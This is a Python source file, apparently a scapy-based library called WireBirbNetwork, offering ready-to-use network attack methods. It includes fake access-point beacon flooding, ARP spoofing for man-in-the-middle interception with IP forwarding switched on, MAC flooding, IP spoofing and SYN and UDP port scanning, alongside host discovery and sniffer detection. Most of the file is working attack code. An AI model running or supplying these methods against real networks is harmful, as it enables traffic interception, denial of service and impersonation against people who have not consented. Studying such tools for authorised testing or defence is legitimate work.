#!/usr/bin/python3

__author__ = "CYB3RMX_"

# Necessary modules
import os,random,requests
from os import system, geteuid
from random import randrange

# Checking if scapy module is exist
try:
    from scapy.all import Dot11, Dot11Beacon, Dot11Elt, RadioTap, sendp, send, Ether, ARP, srp, IP, sr1, TCP, UDP
    from scapy.all import RandMAC, RandIP, ICMP, promiscping
except:
    print("Module: >scapy< not found.")

# Checking permissions
if int(geteuid()) != 0:
    print("[!] You must be a root to use this module")
else:
    pass

# Ignoring scapy outputs
conf.verb=0

# Main class
class WireBirbNetwork:
    """
        Description: 
            A scapy based module for programming offensive and defensive networking tools easier than before.
    """
    def __init__(self):
        pass

    # Creating fake access points
    def createBeacons(self, targetESSID, interface, targetMAC):
        """ This method is creating fake access points

            !!Make sure your wireless card on monitor mode!!

            Usage: wrb.createBeacons(targetESSID='Test AP', interface='wlan0mon', targetMAC='12:ab:34:cd:56:78')
        """
        self.interface = interface
        self.targetMAC = targetMAC
        self.targetESSID = targetESSID

        dot11 = Dot11(type=0, subtype=8, addr1='ff:ff:ff:ff:ff:ff', addr2=str(self.targetMAC), addr3=str(self.targetMAC))
        beacons = Dot11Beacon()
        essid = Dot11Elt(ID='SSID', info=str(self.targetESSID), len=len(self.targetESSID))
        frames = RadioTap()/dot11/beacons/essid
        sendp(frames, inter=0.1, iface=str(self.interface), loop=1)

    # Arp spoofing for MITM attacks
    def arpSpoof(self, routerip, targetip, interface):
        """ This method is for arp spoofing
            
            Usage: wrb.arpSpoof(routerip='192.168.1.1', targetip='192.168.1.154', interface='wlan0')
        """
        self.routerip = routerip
        self.targetip = targetip
        self.interface = interface

        # Parsing mac address
        macaddr = 'ifconfig {} | grep -o "ether [a-z0-9]*:[a-z0-9]*:[a-z0-9]*:[a-z0-9]*:[a-z0-9]*:[a-z0-9]*" | cut -c7-23 > mac.txt'.format(self.interface)
        system(macaddr)
        getMac = open("mac.txt", "r").read().split("\n")
        system("rm -rf mac.txt")

        # Enabling ip forwarding
        system("sudo echo 1 > /proc/sys/net/ipv4/ip_forward")
        try:
            # Sending fake arp requests
            while True:
                send(ARP(op=2, pdst=self.targetip, hwsrc=getMac[0], psrc=self.routerip), verbose=0)
        except:
            # Disabling ip forwarding if any exception occurs
            system("sudo echo 0 > /proc/sys/net/ipv4/ip_forward")

    # Alive host scanning
    def hostProber(self, interface, subnet):
        """ This method is for probing alive hosts on your network
            
            Usage: wrb.hostProber(interface='wlan0', subnet='192.168.1.0/24')
        """
        self.interface = interface
        self.subnet = subnet

        # Creating ARP request packets
        ans, unans=srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=self.subnet), iface=self.interface, timeout=2)
        upHosts = []
        for snd, rcv in ans:
            result = rcv.sprintf(r"%ARP.psrc% %Ether.src%").split()
            upHosts.append(result)
        return upHosts

    # TCP stealth port scanning
    def tcpPortScanner(self, targetip, startPoint, endPoint):
        """ This method is for scanning range of TCP ports

            Usage: wrb.tcpPortScanner(targetip='192.168.1.1', startPoint=1, endPoint=100)
            This code should scan 1-100 range of ports
        """
        self.targetip = targetip
        self.startPoint = startPoint
        self.endPoint = endPoint

        openTCPports = []
        for port in range(self.startPoint, self.endPoint):
            srcPort = randrange(50000, 60000)
            # Creating and sending syn packets
            synPack = IP(dst=self.targetip)/TCP(sport=srcPort, dport=port, flags="S")
            response = sr1(synPack, timeout=1, verbose=0)
            if response:
                if response[TCP].flags == 18:
                    # If response is ack then send rst packets
                    rstPack = IP(dst=self.targetip)/TCP(sport=srcPort, dport=port, flags="R")
                    response = send(rstPack)
                    openTCPports.append(port)
        return openTCPports

    # UDP port scanning
    def udpPortScanner(self, targetip, startPoint, endPoint):
        """ This method is for scanning range of UDP ports

            Usage: wrb.udpPortScanner(targetip='192.168.1.1', startPoint=1, endPoint=100)
            This code should scan 1-100 range of ports
        """
        self.targetip = targetip
        self.startPoint = startPoint
        self.endPoint = endPoint

        openUDPports = []
        for port in range(self.startPoint, self.endPoint):
            # Create UDP packets and send to target
            udpPacket = IP(dst=self.targetip)/UDP(dport=port)
            response = sr1(udpPacket, timeout=5, verbose=0)
            if response == None:
                openUDPports.append(port)
            else:
                pass
        return openUDPports

    # Enabling wireless monitoring(if you want to create fake ap you have to use this method)
    def enableMonitor(self, interface):
        """ This method is for enabling wireless monitoring mode

            !! Attention this method needs aircrack-ng suite !!

            Usage: wrb.enableMonitor(interface='wlan0')
        """
        self.interface = interface

        try:
            command = "sudo airmon-ng check kill > /dev/null"
            system(command)
            command = "sudo airmon-ng start {} > /dev/null".format(self.interface)
            system(command)
            return True
        except:
            print("An error occured while enabling monitor mode. Are you have aircrack-ng suite?")
            return False

    # Disabling wireless monitoring(clean everything)
    def disableMonitor(self, interface):
        """ This method is for disabling wireless monitoring mode

            Usage: wrb.disableMonitor(interface='wlan0mon')
        """
        self.interface = interface

        try:
            command = "sudo airmon-ng stop {} > /dev/null".format(self.interface)
            system(command)
            command = "sudo systemctl restart NetworkManager.service > /dev/null"
            system(command)
            command = "sudo systemctl restart wpa_supplicant.service > /dev/null"
            system(command)
            return True
        except:
            print("An error occured while disabling monitor mode. Are you have aircrack-ng suite?")
            return False

    # Get device vendor by target's mac address
    def getVendor(self, targetMAC):
        """ This method is for getting information about device vendor by device's mac address

            Usage: wrb.getVendor(targetMAC='12:ab:34:cd:ed:78')
        """
        self.targetMAC = targetMAC

        vendor = requests.get("https://api.macvendors.com/{}".format(self.targetMAC))
        return vendor.text

    # Simulating MAC flood attacks
    def macFlood(self, interface, targetip):
        """ This method is for mac flooding
            
            Usage: wrb.macFlood(interface='wlan0', targetip='192.168.1.154')
        """
        self.interface = interface
        self.targetip = targetip

        floodPacket = Ether(src=RandMAC("*:*:*:*:*:*"), dst=RandMAC("*:*:*:*:*:*"))/IP(src=RandIP("*.*.*.*"), dst=self.targetip)/ICMP()
        sendp(floodPacket, iface=self.interface, loop=1)

    # Sniffer detection
    def badNose(self, subnet):
        """ This method is for detecting network sniffers remotely on your network
            
            Usage: wrb.badNose(subnet='192.168.1.0/24')
        """
        self.subnet = subnet

        promiscping(self.subnet)

    # IP spoofing
    def ipSpoof(self, fakeip, targetip):
        """ This method is for simulating ip spoofing attacks
            
            Usage: wrb.ipSpoof(fakeip='192.168.1.anything', targetip='192.168.1.154')
        """
        self.fakeip = fakeip
        self.targetip = targetip

        packSpoof = IP(src=self.fakeip, dst=self.targetip)/ICMP()
        answer = send(packSpoof)

        if answer:
            answer.show()
